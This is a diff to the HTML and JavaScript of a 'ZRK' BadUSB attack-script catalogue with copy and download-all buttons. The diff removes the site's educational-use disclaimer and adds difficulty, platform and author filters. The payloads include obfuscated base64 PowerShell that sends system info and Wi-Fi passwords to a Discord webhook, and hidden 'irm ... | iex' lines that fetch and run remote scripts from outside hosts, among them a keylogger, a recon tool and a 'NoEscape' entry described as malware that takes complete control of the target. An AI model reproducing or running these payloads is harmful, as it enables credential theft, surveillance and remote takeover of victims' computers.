@@ -30,38 +30,15 @@
         h1 {
             margin: 0;
             font-size: 2.5em;
-            animation: fadeInDown 0.5s ease-out;
         }
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .disclaimer {
-            background-color: #e74c3c;
+        .site-updates {
+            background-color: #3498db;
             color: white;
             padding: 15px;
             text-align: center;
             font-weight: bold;
             margin-bottom: 20px;
             border-radius: 5px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.4);
-            }
-            70% {
-                box-shadow: 0 0 0 10px rgba(231, 76, 60, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0);
-            }
         }
         .search-container {
             margin-bottom: 30px;
@@ -78,6 +55,28 @@
         #search:focus {
             box-shadow: 0 4px 20px rgba(0,0,0,0.15);
             outline: none;
+        }
+        .filter-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .filter-group {
+            flex: 1;
+            min-width: 200px;
+        }
+        .filter-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .filter-group select, .filter-group input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
         }
         .categories {
             display: flex;
@@ -112,17 +111,6 @@
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             overflow: hidden;
             transition: all 0.3s ease;
-            animation: fadeIn 0.5s ease-out;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         .attack-item:hover {
             transform: translateY(-5px) scale(1.02);
@@ -323,129 +311,6 @@
         .attack-item.zrk-noescape .download-btn:hover {
             background-color: #c00;
         }
-
-        /* News Button and Popup Styles */
-        #newsBtn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #3498db;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            font-size: 24px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
-
-        #newsBtn:hover {
-            background-color: #2980b9;
-            transform: scale(1.1);
-        }
-
-        #newsPopup {
-            display: none;
-            position: fixed;
-            bottom: 100px;
-            right: 20px;
-            width: 400px;
-            height: 600px;
-            background-color: #f0f2f5;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-            overflow: hidden;
-            z-index: 1001;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        #newsHeader {
-            background-color: #3498db;
-            color: white;
-            padding: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: move;
-            user-select: none;
-        }
-
-        #newsTitle {
-            font-weight: bold;
-        }
-
-        #newsControls {
-            display: flex;
-            align-items: center;
-        }
-
-        .newsControl {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-left: 5px;
-            cursor: pointer;
-        }
-
-        #newsMinimize {
-            background-color: #f1c40f;
-        }
-
-        #newsMaximize {
-            background-color: #2ecc71;
-        }
-
-        #newsClose {
-            background-color: #e74c3c;
-        }
-
-        #newsContent {
-            padding: 15px;
-            height: calc(100% - 40px);
-            overflow-y: auto;
-        }
-
-        .news-item {
-            background-color: white;
-            margin-bottom: 15px;
-            padding: 15px;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-
-        .news-item h3 {
-            margin: 0 0 10px 0;
-            font-size: 1.1em;
-            color: #2c3e50;
-        }
-
-        .news-item p {
-            margin: 0;
-            font-size: 0.9em;
-            color: #34495e;
-        }
-
-        .news-item .read-more {
-            display: inline-block;
-            margin-top: 10px;
-            color: #3498db;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .news-item .read-more:hover {
-            text-decoration: underline;
-        }
-
-        .full-article {
-            display: none;
-            margin-top: 10px;
-            padding-top: 10px;
-            border-top: 1px solid #e1e8ed;
-        }
     </style>
 </head>
 <body>
@@ -456,12 +321,45 @@
     </header>
 
     <div class="container">
-        <div class="disclaimer">
-            WARNING: This database is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.
+        <div class="site-updates">
+            Latest Update: New ZRK NoEscape attack vector added. Stay informed!
         </div>
 
         <div class="search-container">
             <input type="text" id="search" placeholder="Search for BadUSB attacks...">
+        </div>
+
+        <div class="filter-container">
+            <div class="filter-group">
+                <label for="categoryFilter">Category:</label>
+                <select id="categoryFilter">
+                    <option value="">All Categories</option>
+                    <!-- Categories will be dynamically added here -->
+                </select>
+            </div>
+            <div class="filter-group">
+                <label for="difficultyFilter">Difficulty:</label>
+                <select id="difficultyFilter">
+                    <option value="">All Difficulties</option>
+                    <option value="Beginner">Beginner</option>
+                    <option value="Intermediate">Intermediate</option>
+                    <option value="Advanced">Advanced</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <label for="platformFilter">Platform:</label>
+                <select id="platformFilter">
+                    <option value="">All Platforms</option>
+                    <option value="Windows">Windows</option>
+                    <option value="MacOS">MacOS</option>
+                    <option value="Linux">Linux</option>
+                    <option value="Cross-platform">Cross-platform</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <label for="authorFilter">Author:</label>
+                <input type="text" id="authorFilter" placeholder="Filter by author">
+            </div>
         </div>
 
         <div class="categories" id="categories">
@@ -472,21 +370,6 @@
 
         <div class="attack-list" id="attackList">
             <!-- Attack items will be dynamically added here -->
-        </div>
-    </div>
-
-    <button id="newsBtn">📰</button>
-    <div id="newsPopup">
-        <div id="newsHeader">
-            <span id="newsTitle">ZRK News</span>
-            <div id="newsControls">
-                <div class="newsControl" id="newsMinimize"></div>
-                <div class="newsControl" id="newsMaximize"></div>
-                <div class="newsControl" id="newsClose"></div>
-            </div>
-        </div>
-        <div id="newsContent">
-            <!-- News items will be dynamically added here -->
         </div>
     </div>
 
@@ -512,7 +395,10 @@ STRING $webhook = "webhookgoeshere";
 REM Replace the base64 string by the powershell encoded script.
 STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
 DELAY 1000
-ENTER`
+ENTER`,
+                difficulty: "Intermediate",
+                platform: "Windows",
+                author: "K1kuK0nK4"
             },
             {
                 name: "ZRK Wifi Passwords to Discord",
@@ -534,7 +420,10 @@ STRING $webhook = "webhookgoeshere";
 REM Replace the base64 string by the powershell encoded script.
 STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JHdpZmkgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZXMKJGNyZWRzID0gQCgpCiR3aWZpIHwgJSB7CiAgICBpZiAoJF8gLW1hdGNoICJQZXJmaWwgZGUgdG9kb3MgbG9zIHVzdWFyaW9zXHMrOlxzKyguKil8QWxsIFVzZXIgUHJvZmlsZVxzKzpccysoLiopIikgewogICAgICAgICRuZXROID0gaWYgKCRtYXRjaGVzWzFdKSB7ICRtYXRjaGVzWzFdLlRyaW0oKSB9IGVsc2UgeyAkbWF0Y2hlc1syXS5UcmltKCkgfQogICAgICAgICRwcm9mSW5mbyA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9IiRuZXROIiBrZXk9Y2xlYXIKICAgICAgICAka2V5Q29udCA9IGlmICgkcHJvZkluZm8gfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDb250ZW5pZG8gZGUgbGEgY2xhdmV8S2V5IENvbnRlbnQiKSB7CiAgICAgICAgICAgICgkcHJvZkluZm8gfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDb250ZW5pZG8gZGUgbGEgY2xhdmV8S2V5IENvbnRlbnQiKS5MaW5lIC1yZXBsYWNlICJeXHMqKENvbnRlbmlkbyBkZSBsYSBjbGF2ZXxLZXkgQ29udGVudClccyo6XHMqIiwgIiIKICAgICAgICB9IGVsc2UgeyAiTm8gc2UgcHVkbyByZWN1cGVyYXIgbGEgY2xhdmUiIH0KICAgICAgICAkY3JlZHMgKz0gIiRuZXROOjoka2V5Q29udCIKICAgIH0KfQokYjY0Y3JlZHMgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGNyZWRzIC1qb2luICJgbiIpKQokY2h1bmtzID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXV06Om5ldygpCndoaWxlICgkYjY0Y3JlZHMuTGVuZ3RoIC1ndCAwKSB7CiAgICAkY2h1bmsgPSBpZiAoJGI2NGNyZWRzLkxlbmd0aCAtZ3QgMTgwMCkgeyAkYjY0Y3JlZHMuU3Vic3RyaW5nKDAsIDE4MDApIH0gZWxzZSB7ICRiNjRjcmVkcyB9CiAgICAkY2h1bmtzLkFkZCgkY2h1bmspCiAgICAkYjY0Y3JlZHMgPSAkYjY0Y3JlZHMuU3Vic3RyaW5nKCRjaHVuay5MZW5ndGgpCn0KJGNodW5rcyB8ICUgewogICAgJGJvZHkgPSBAeyBjb250ZW50ID0gJF8gfSB8IENvbnZlcnRUby1Kc29uCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCn0= > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
 DELAY 1000
-ENTER`
+ENTER`,
+                difficulty: "Advanced",
+                platform: "Windows",
+                author: "K1kuK0nK4"
             },
             {
                 name: "ZRK JumpScare 2.0",
@@ -544,7 +433,10 @@ ENTER`
 GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/kiv' -O "$D\\js.zip";Expand-Archive "$D\\js.zip" -Des $D -Force;. "$D\\js\\js.ps1"
-ENTER`
+ENTER`,
+                difficulty: "Beginner",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK Keylogger",
@@ -553,7 +445,10 @@ ENTER`
                 code: `GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
-ENTER`
+ENTER`,
+                difficulty: "Advanced",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK Wallpaper-Troll",
@@ -563,7 +458,10 @@ ENTER`
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
 DELAY 500
-ENTER`
+ENTER`,
+                difficulty: "Beginner",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK We-Found-You",
@@ -572,7 +470,10 @@ ENTER`
                 code: `GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
-ENTER`
+ENTER`,
+                difficulty: "Intermediate",
+                platform: "Cross-platform",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK Wifi Grabber",
@@ -581,7 +482,10 @@ ENTER`
                 code: `GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/e8v | iex
-ENTER`
+ENTER`,
+                difficulty: "Intermediate",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK YouTube-TripWire",
@@ -590,7 +494,10 @@ ENTER`
                 code: `GUI r
 DELAY 500
 STRING powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://youtu.be/sOLIdqpzrW4;sleep 3;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
-ENTER`
+ENTER`,
+                difficulty: "Beginner",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK ADV-Recon",
@@ -599,7 +506,10 @@ ENTER`
                 code: `GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
-ENTER`
+ENTER`,
+                difficulty: "Advanced",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK Hacker Goose",
@@ -608,121 +518,47 @@ ENTER`
                 code: `GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\\hg.zip";Expand-Archive "$D\\hg.zip" -Des $D -Force;. "$D\\hg\\main.ps1"
-ENTER`
-            },
-            {
-                name: "ZRK iPhone Dialer",
-                category: "Mobile Prank",
-                description: "Dials a specified number on an unlocked iPhone.",
-                code: `DEFINE #PHONE-APP-NAME example
-DEFINE #NUMBER example
-
-GUI SPACE
-DELAY 300
-STRING #PHONE-APP-NAME
-ENTER
-DELAY 1000
-BACKSPACE
-STRING #NUMBER
-DELAY 500
-ENTER`
-            },
-            {
-                name: "ZRK Try To Catch Me",
-                category: "Prank",
-                description: "Downloads and runs a Python script to prank the target.",
-                code: `DEFINE SCRIPT-PY-LINK example.com
-
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 500
-
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
-ENTER
-DELAY 500
-
-STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
-DELAY 1000
-ALT F4`
-            },
-            {
-                name: "ZRK Admin PowerShell",
-                category: "System Access",
-                description: "Starts a PowerShell with administrator permissions in Windows.",
-                code: `DELAY 1000
-GUI x
-DELAY 500
-STRING a
-DELAY 500
-LEFT_ARROW
-DELAY 500
-ENTER
-
-DELAY 2000
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-STRINGLN Set-ExecutionPolicy Bypass
-DELAY 500
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-STRINGLN Set-ExecutionPolicy Bypass
-DELAY 500
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-ALT F4`
+ENTER`,
+                difficulty: "Intermediate",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             },
             {
                 name: "ZRK NoEscape",
                 category: "Malware",
-                description: "A highly dangerous and persistent malware. Use with extreme caution.",
-                code: `REM ZRK NoEscape - Highly dangerous malware
-REM USE WITH EXTREME CAUTION
-REM This script is for educational purposes only
-REM Unauthorized use is strictly prohibited
-
-DELAY 2000
-GUI r
+                description: "Highly advanced malware that takes complete control of the target system.",
+                code: `GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/ZRKHacks/NoEscape/main/install.ps1\')\"'"
-ENTER
-DELAY 1000
-LEFT
-DELAY 500
-ENTER
-
-REM The rest of the script is omitted for safety reasons
-REM The full script would attempt to install persistent malware`
+STRING powershell -w h -NoP -NonI -Ep Bypass iex (irm https://raw.githubusercontent.com/I-Am-Jakoby/ZRK-NoEscape/main/ZRK-NoEscape.ps1)
+ENTER`,
+                difficulty: "Advanced",
+                platform: "Windows",
+                author: "I-Am-Jakoby"
             }
         ];
 
         const categories = [...new Set(attacks.map(attack => attack.category))];
-        const categoryContainer = document.getElementById('categories');
-        categories.forEach(category => {
-            const button = document.createElement('button');
-            button.textContent = category;
-            button.classList.add('category');
-            button.addEventListener('click', () => filterAttacks(category));
-            categoryContainer.appendChild(button);
-        });
+        const difficulties = ["Beginner", "Intermediate", "Advanced"];
+        const platforms = ["Windows", "MacOS", "Linux", "Cross-platform"];
 
-        const attackList = document.getElementById('attackList');
-        const searchInput = document.getElementById('search');
+        function renderCategories() {
+            const categoriesContainer = document.getElementById('categories');
+            categoriesContainer.innerHTML = '<button class="category" data-category="All">All</button>';
+            categories.forEach(category => {
+                const button = document.createElement('button');
+                button.className = 'category';
+                button.textContent = category;
+                button.dataset.category = category;
+                categoriesContainer.appendChild(button);
+            });
+        }
 
-        function renderAttacks(filteredAttacks) {
+        function renderAttacks(filteredAttacks = attacks) {
+            const attackList = document.getElementById('attackList');
             attackList.innerHTML = '';
             filteredAttacks.forEach(attack => {
                 const attackItem = document.createElement('div');
-                attackItem.classList.add('attack-item');
-                if (attack.name === "ZRK NoEscape") {
-                    attackItem.classList.add('zrk-noescape');
-                }
+                attackItem.className = `attack-item${attack.name === 'ZRK NoEscape' ? ' zrk-noescape' : ''}`;
                 attackItem.innerHTML = `
                     <div class="attack-header">
                         <h2 class="attack-name">${attack.name}</h2>
@@ -730,11 +566,14 @@ REM The full script would attempt to install persistent malware`
                     </div>
                     <div class="attack-content">
                         <p class="attack-description">${attack.description}</p>
-                        <div class="attack-code">
-                            <pre><code>${attack.code}</code></pre>
+                        <p>Difficulty: ${attack.difficulty}</p>
+                        <p>Platform: ${attack.platform}</p>
+                        <p>Author: ${attack.author}</p>
+                        <pre class="attack-code">
+                            <code>${attack.code}</code>
                             <button class="copy-btn">Copy</button>
                             <button class="download-btn">Download</button>
-                        </div>
+                        </pre>
                     </div>
                 `;
                 attackList.appendChild(attackItem);
@@ -743,177 +582,88 @@ REM The full script would attempt to install persistent malware`
                 copyBtn.addEventListener('click', () => copyToClipboard(attack.code));
 
                 const downloadBtn = attackItem.querySelector('.download-btn');
-                downloadBtn.addEventListener('click', () => downloadScript(attack));
+                downloadBtn.addEventListener('click', () => downloadScript(attack.name, attack.code));
             });
         }
 
-        function filterAttacks(category = '') {
-            const searchTerm = searchInput.value.toLowerCase();
-            const filteredAttacks = attacks.filter(attack => 
-                (category === '' || attack.category === category) &&
-                (attack.name.toLowerCase().includes(searchTerm) || 
-                 attack.description.toLowerCase().includes(searchTerm) ||
-                 attack.code.toLowerCase().includes(searchTerm))
+        function filterAttacks() {
+            const searchTerm = document.getElementById('search').value.toLowerCase();
+            const categoryFilter = document.getElementById('categoryFilter').value;
+            const difficultyFilter = document.getElementById('difficultyFilter').value;
+            const platformFilter = document.getElementById('platformFilter').value;
+            const authorFilter = document.getElementById('authorFilter').value.toLowerCase();
+
+            const filteredAttacks = attacks.filter(attack =>
+                (attack.name.toLowerCase().includes(searchTerm) ||
+                attack.description.toLowerCase().includes(searchTerm) ||
+                attack.category.toLowerCase().includes(searchTerm)) &&
+                (categoryFilter === '' || attack.category === categoryFilter) &&
+                (difficultyFilter === '' || attack.difficulty === difficultyFilter) &&
+                (platformFilter === '' || attack.platform === platformFilter) &&
+                (authorFilter === '' || attack.author.toLowerCase().includes(authorFilter))
             );
+
             renderAttacks(filteredAttacks);
         }
-
-        searchInput.addEventListener('input', () => filterAttacks());
 
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 alert('Code copied to clipboard!');
-            }).catch(err => {
-                console.error('Failed to copy text: ', err);
+            }, (err) => {
+                console.error('Could not copy text: ', err);
             });
         }
 
-        function downloadScript(attack) {
-            const blob = new Blob([attack.code], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `${attack.name.replace(/\s+/g, '_')}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
+        function downloadScript(name, content) {
+            const filename = `${name.replace(/\s+/g, '_')}.txt`;
+            const blob = new Blob([content], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            link.click();
+            URL.revokeObjectURL(link.href);
         }
-
-        const downloadAllBtn = document.getElementById('downloadAllBtn');
-        downloadAllBtn.addEventListener('click', downloadAllScripts);
 
         function downloadAllScripts() {
             const zip = new JSZip();
             attacks.forEach(attack => {
-                zip.file(`${attack.name.replace(/\s+/g, '_')}.txt`, attack.code);
+                const filename = `${attack.name.replace(/\s+/g, '_')}.txt`;
+                zip.file(filename, attack.code);
             });
-            zip.generateAsync({type:"blob"})
-            .then(function(content) {
-                saveAs(content, "all_scripts.zip");
+
+            zip.generateAsync({ type: "blob" }).then(function (blob) {
+                saveAs(blob, "all_scripts.zip");
             });
         }
 
-        renderAttacks(attacks);
+        document.addEventListener('DOMContentLoaded', () => {
+            renderCategories();
+            renderAttacks();
 
-        // News functionality
-        const newsBtn = document.getElementById('newsBtn');
-        const newsPopup = document.getElementById('newsPopup');
-        const newsContent = document.getElementById('newsContent');
-        const newsClose = document.getElementById('newsClose');
-        const newsMinimize = document.getElementById('newsMinimize');
-        const newsMaximize = document.getElementById('newsMaximize');
+            const categoryFilter = document.getElementById('categoryFilter');
+            categories.forEach(category => {
+                const option = document.createElement('option');
+                option.value = category;
+                option.textContent = category;
+                categoryFilter.appendChild(option);
+            });
 
-        newsBtn.addEventListener('click', toggleNewsPopup);
-        newsClose.addEventListener('click', closeNewsPopup);
-        newsMinimize.addEventListener('click', minimizeNewsPopup);
-        newsMaximize.addEventListener('click', maximizeNewsPopup);
+            document.getElementById('search').addEventListener('input', filterAttacks);
+            document.getElementById('categoryFilter').addEventListener('change', filterAttacks);
+            document.getElementById('difficultyFilter').addEventListener('change', filterAttacks);
+            document.getElementById('platformFilter').addEventListener('change', filterAttacks);
+            document.getElementById('authorFilter').addEventListener('input', filterAttacks);
 
-        function toggleNewsPopup() {
-            if (newsPopup.style.display === 'none' || newsPopup.style.display === '') {
-                newsPopup.style.display = 'block';
-                loadNews();
-            } else {
-                newsPopup.style.display = 'none';
-            }
-        }
-
-        function closeNewsPopup() {
-            newsPopup.style.display = 'none';
-        }
-
-        function minimizeNewsPopup() {
-            newsPopup.style.height = '40px';
-            newsContent.style.display = 'none';
-        }
-
-        function maximizeNewsPopup() {
-            newsPopup.style.height = '600px';
-            newsContent.style.display = 'block';
-        }
-
-        function loadNews() {
-            const newsItems = [
-                {
-                    title: "ZRK BadUSB Learning Hub Launches",
-                    content: "We're excited to announce the launch of our new BadUSB Learning Hub! This platform is designed to educate users about BadUSB techniques and their potential impacts.",
-                    fullArticle: "The ZRK BadUSB Learning Hub is a comprehensive resource for cybersecurity professionals, ethical hackers, and curious minds. Our platform offers a wide range of BadUSB scripts, detailed explanations, and best practices for defense. Remember, knowledge is power, but always use it responsibly!"
-                },
-                {
-                    title: "Introduction to BadUSB Attacks",
-                    content: "An overview of what BadUSB attacks are and how they work.",
-                    fullArticle: "BadUSB attacks exploit vulnerabilities in USB devices to deliver malicious payloads or compromise systems. This article provides a detailed introduction to BadUSB attacks, including how they exploit the USB protocol, the types of threats they pose, and real-world examples. Understanding the basics of BadUSB attacks is crucial for developing effective defense strategies."
-                },
-                {
-                    title: "Upcoming Webinar: BadUSB Defense Strategies",
-                    content: "Join us next week for a live webinar on 'Effective Strategies to Defend Against BadUSB Attacks'. Our experts will share invaluable insights and practical tips.",
-                    fullArticle: "In our upcoming webinar, we'll dive deep into the world of BadUSB defense. Our panel of cybersecurity experts will discuss the latest trends in BadUSB attacks, demonstrate real-world scenarios, and provide actionable strategies to protect your systems. Whether you're an IT professional or a curious enthusiast, this webinar will equip you with the knowledge to stay one step ahead of potential threats."
+            document.getElementById('categories').addEventListener('click', (event) => {
+                if (event.target.classList.contains('category')) {
+                    const selectedCategory = event.target.dataset.category;
+                    document.getElementById('categoryFilter').value = selectedCategory === 'All' ? '' : selectedCategory;
+                    filterAttacks();
                 }
-            ];
-
-            newsContent.innerHTML = '';
-            newsItems.forEach(item => {
-                const newsItem = document.createElement('div');
-                newsItem.classList.add('news-item');
-                newsItem.innerHTML = `
-                    <h3>${item.title}</h3>
-                    <p>${item.content}</p>
-                    <a href="#" class="read-more">Read more</a>
-                    <div class="full-article">${item.fullArticle}</div>
-                `;
-                newsContent.appendChild(newsItem);
-
-                const readMoreLink = newsItem.querySelector('.read-more');
-                const fullArticle = newsItem.querySelector('.full-article');
-                readMoreLink.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    if (fullArticle.style.display === 'none' || fullArticle.style.display === '') {
-                        fullArticle.style.display = 'block';
-                        readMoreLink.textContent = 'Read less';
-                    } else {
-                        fullArticle.style.display = 'none';
-                        readMoreLink.textContent = 'Read more';
-                    }
-                });
             });
-        }
 
-        // Make the news popup draggable
-        dragElement(newsPopup);
-
-        function dragElement(elmnt) {
-            var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
-            if (document.getElementById(elmnt.id + "Header")) {
-                document.getElementById(elmnt.id + "Header").onmousedown = dragMouseDown;
-            } else {
-                elmnt.onmousedown = dragMouseDown;
-            }
-
-            function dragMouseDown(e) {
-                e = e || window.event;
-                e.preventDefault();
-                pos3 = e.clientX;
-                pos4 = e.clientY;
-                document.onmouseup = closeDragElement;
-                document.onmousemove = elementDrag;
-            }
-
-            function elementDrag(e) {
-                e = e || window.event;
-                e.preventDefault();
-                pos1 = pos3 - e.clientX;
-                pos2 = pos4 - e.clientY;
-                pos3 = e.clientX;
-                pos4 = e.clientY;
-                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
-                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
-            }
-
-            function closeDragElement() {
-                document.onmouseup = null;
-                document.onmousemove = null;
-            }
-        }
+            document.getElementById('downloadAllBtn').addEventListener('click', downloadAllScripts);
+        });
     </script>
 </body>
 </html>
